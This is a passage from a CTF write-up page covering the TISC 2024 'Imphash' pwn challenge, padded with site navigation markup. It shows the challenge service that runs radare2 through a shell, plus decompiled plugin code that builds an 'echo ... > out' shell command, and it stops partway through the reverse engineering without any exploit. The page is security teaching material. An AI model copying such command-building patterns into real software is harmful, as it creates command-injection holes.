<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="itV46hbDi3fy1f3Y0RzL_9VcLkVXIyVG_6HSfYp59S8">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>Jia Jie's writeups</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-07f0d8be.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-70594d0d.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z" fill="white"></path></svg></a><a href="https://jiajie.surge.sh" target="_blank" class="h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden"> main website <i class="material-symbols-outlined text-2xl ml-3">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a aria-current="page" href="/ctf-writeups/writeups/imphash" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 9</span></a><a href="/ctf-writeups/writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a aria-current="page" href="/ctf-writeups/writeups/imphash" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Level 9</span></a><a href="/ctf-writeups/writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-2xl opacity-40 mb-1"></span><h1 class="mb-7">Imphash</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>Almost there agent, we might have a chance to gain access into the enemy's systems again!! We are so close.</p>
<p>But, it seems like they've developed a robust anti-malware service that's thwarting all attempts to breach their systems!</p>
<p>We've found this import hashing plugin which is a key component of their malware analysis pipeline. Agent, can you find a way around it?</p>
<p><code>nc chals.tisc24.ctf.sg 53719</code></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">bug_report</i><span class="mr-4 text-black font-semibold">pwn</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">17 solves</span><span class="opacity-60">0 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by jro</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://api.tisc24.csit-events.sg/file?id=cm0y2gp5539kc0854kuz8ze52&amp;name=imphash.zip&amp;req=clzv2z8zr0c5q0854jk6g5acs&amp;reqHash=f316095a237261216e1674a9501c74d2129ef2734263c6cedbc04ddcc4edc5049442a55e83eef141e093af331a2db2e0bc2d8f0cea3803ec5104932fb45f6856&amp;reqExp=1727782114" class="underline">imphash.zip</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>We are provided the source for this challenge:</p>
<p><img src="/ctf-writeups/tisc24/imphash_source.png" alt=""></p>
<p><code>service.py</code> is where the entry point:</p>
<pre class="named-fence-block"><code class="language-python">#!/usr/bin/python3

import os
import subprocess
import base64
import secrets

fdata = input("Input PE file (base64 encoded): ")
try:
    fdata = base64.b64decode(fdata.encode())
except:
    print("Invalid base64!", flush=True)
    exit(1)

dirname = "/app/uploads/"+secrets.token_hex(16)
os.mkdir(dirname)
os.chdir(dirname)
with open("./file.exe", "wb") as f:
    f.write(fdata)

subprocess.run(["r2 -q -c imp -e bin.relocs.apply=true file.exe"],
               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)

if os.path.isfile("out"):
    with open("./out", "r") as f:
        print("Import hash:", f.read(), flush=True)
else:
    print("Error generating imphash!", flush=True)

os.chdir("/app")
# os.system("rm -rf "+dirname)
</code><div class="named-fence-filename">service.py</div></pre>
<p>It takes in a windows PE executable as input, and runs the command <code>r2 -q -c imp -e bin.relocs.apply=true file.exe</code> on it. <code>r2</code> is radare2, a "framework for reverse engineering and analysing binaries". I asked ChatGPT to explain the command parameters:</p>
<pre><code class="language-plaintext">-q: This flag runs Radare2 in quiet mode, meaning that it suppresses unnecessary output (e.g., banners, debugging information).

-c imp: The -c option allows you to pass commands that should be executed after the binary is loaded. In this case, the command imp is used to list imported functions.
    * imp stands for "imports," and it will show the external functions that the binary relies on (e.g., functions from shared libraries or dynamic link libraries like .dll files).

-e bin.relocs.apply=true: This flag sets a Radare2 configuration option using -e. In this case, the configuration being set is:
    * bin.relocs.apply=true: This option tells Radare2 to apply relocations. Relocations are used to adjust memory addresses in the binary so that they can work with different memory layouts. Setting this to true applies any relocations found in the binary, which is essential for certain types of analysis and execution.
</code></pre>
<p>In Dockerfile, we can see that libcoreimp.so is a radare2 plugin:</p>
<pre><code class="language-Dockerfile">RUN mkdir -p /home/ctf/.local/share/radare2/plugins
COPY libcoreimp.so /home/ctf/.local/share/radare2/plugins
RUN chmod 755 /home/ctf/.local/share/radare2/plugins/libcoreimp.so
</code></pre>
<p>Additionally, a specific revision of radare2 is being installed:</p>
<pre><code class="language-Dockerfile">RUN git clone https://github.com/radare/radare2.git radare2 &amp;&amp; \
    cd radare2 &amp;&amp; \
    ./sys/install-rev.sh 0da877e
</code></pre>
<p>This may be important to the challenge, hence I installed radare2 locally using the same commands.</p>
<h1 id="reversing-libcoreimp.so" tabindex="-1">Reversing libcoreimp.so</h1>
<p>After importing the file into ghidra and analysing, we see the function <code>r_cmd_imp_client</code>. The <code>-c imp</code> option above seems to be calling it.</p>
<pre><code class="language-c">undefined8 r_cmd_imp_client(undefined8 param_1,undefined8 param_2)

{
  size_t all_imports_len;
  MD5_CTX hasher;
  uchar hash [16];
  char command [41];
  short offset;
  char all_imports [4110];
  int funcname_len;
  int libname_len;
  char *funcname;
  char *libname;
  long bintype;
  int j;
  int i;
  // NOTE: other stack variables omitted for brevity
  
  local_28 = param_1;
  cVar2 = r_str_startswith_inline(param_2,&amp;DAT_001021a0); // "imp"
  if (cVar2 == '\0') {
    uVar4 = 0;
  }
  else {
    offset = 0;
    memset(all_imports,0,0x1000);
    memset(hash,0,0x110);
    builtin_strncpy(command,"echo ",6);
    builtin_strncpy(command + 0x25," &gt; o",4);
    _uStack_117f = CONCAT13(uStack_117c,0x7475); // "ut"
    local_30 = r_core_cmd_str(local_28,&amp;DAT_001021a4); // "iIj"
    local_38 = cJSON_Parse(local_30);
    bintype = cJSON_GetObjectItemCaseSensitive(local_38,"bintype");
    iVar3 = strncmp(*(char **)(bintype + 0x20),"pe",2);
    if (iVar3 == 0) {
      // ... main function logic ...
    }
    else {
      puts("File is not PE file!");
      uVar4 = 1;
    }
  }
  return uVar4;
}
</code></pre>
<p>It checks that <code>param_2</code> (presumably the command name) is "imp", and runs the radare2 command <code>iIj</code>. According to r2 docs, <code>iI</code> returns binary information and is "similar to the file command". <code>j</code> at the end formats the output in json. For example:</p>
<pre><code class="language-plaintext">[0x1400013f0]&gt; iIj
{"arch":"x86","baddr":5368709120,"binsz":61811,"bintype":"pe","bits":64,"canary":false,"injprot":false,"retguard":false,"class":"PE32+","cmp.csum":"0x0001dc15","compiled":"Sat Sep 21 02:48:58 2024","compiler":"","crypto":false,"dbg_file":"","endian":"little","havecode":true,"hdr.csum":"0x0001dc15","guid":"","intrp":"","laddr":0,"lang":"c","linenum":true,"lsyms":false,"machine":"AMD 64","nx":true,"os":"windows","overlay":true,"cc":"ms","pic":true,"relocs":false,"rpath":"","signed":false,"sanitize":false,"static":false,"stripped":false,"subsys":"Windows CUI","va":true,"checksums":{}}
</code></pre>
<p>Following this, the function uses cjson to parse the output and checks that <code>bintype</code> is <code>pe</code>.</p>
<p>Aside from the peliminary checks there is also some string construction going on. <code>command</code> (which I renamed to better reflect its usage) becomes <code>echo [32 uninitialized bytes] &gt; out</code>.</p>
<p>Next we move to the main part of the function, beginning with this section:</p>
<pre><code class="language-c">      pvVar5 = (void *)r_core_cmd_str(local_28,&amp;DAT_001021c8); // "aa"
      free(pvVar5);
      local_48 = r_core_cmd_str(local_28,&amp;DAT_001021cb); // "iij"
      local_50 = cJSON_Parse(local_48);
      if (local_50 == 0) {
